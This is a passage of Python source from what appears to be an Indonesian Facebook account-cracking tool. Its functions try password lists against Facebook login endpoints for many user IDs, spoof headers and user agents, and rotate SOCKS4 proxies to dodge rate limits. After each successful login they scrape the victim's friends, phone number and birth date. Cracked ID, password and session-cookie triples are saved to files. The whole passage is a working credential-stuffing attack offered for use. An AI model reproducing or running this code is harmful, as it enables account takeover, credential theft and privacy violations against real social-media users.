						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
	
def cracknokia(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = uaasepitgansxc()
	ses = requests.Session()
	req = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Nokia [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://nokia.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'nokia.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.trunkstable.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://nokia.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://nokia.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1


#-------[METHOD MOBILE BY ASEPITGANS]--------#
def crackdatekk(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Validate¹ [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=453099894792994&kid_directed_site=0&app_id=453099894792994&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D453099894792994%26state%3Dfbfc946f3bc21355d7fd790927d79c07%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.hipwee.com%252Fwp-login.php%253FloginFacebook%253D1%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7ee34140-cd2d-4057-ba28-41afc8ab1849%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.hipwee.com%2Fwp-login.php%3FloginFacebook%3D1%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbfc946f3bc21355d7fd790927d79c07%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.latest.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.latest.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=453099894792994&kid_directed_site=0&app_id=453099894792994&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D453099894792994%26state%3Dfbfc946f3bc21355d7fd790927d79c07%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.hipwee.com%252Fwp-login.php%253FloginFacebook%253D1%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7ee34140-cd2d-4057-ba28-41afc8ab1849%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.hipwee.com%2Fwp-login.php%3FloginFacebook%3D1%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbfc946f3bc21355d7fd790927d79c07%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?api_key=453099894792994&auth_token=5c1fc24ac57583c8e9c0c55c1cb909b8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D453099894792994%26state%3Dfbfc946f3bc21355d7fd790927d79c07%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3Dhttps%253A%252F%252Fwww.hipwee.com%252Fwp-login.php%253FloginFacebook%253D1%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7ee34140-cd2d-4057-ba28-41afc8ab1849%26tp%3Dunspecified&refsrc=deprecated&app_id=453099894792994&cancel=https%3A%2F%2Fwww.hipwee.com%2Fwp-login.php%3FloginFacebook%3D1%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbfc946f3bc21355d7fd790927d79c07%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackdatep(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Validate [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({"Host": "m.latest.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.latest.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.latest.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
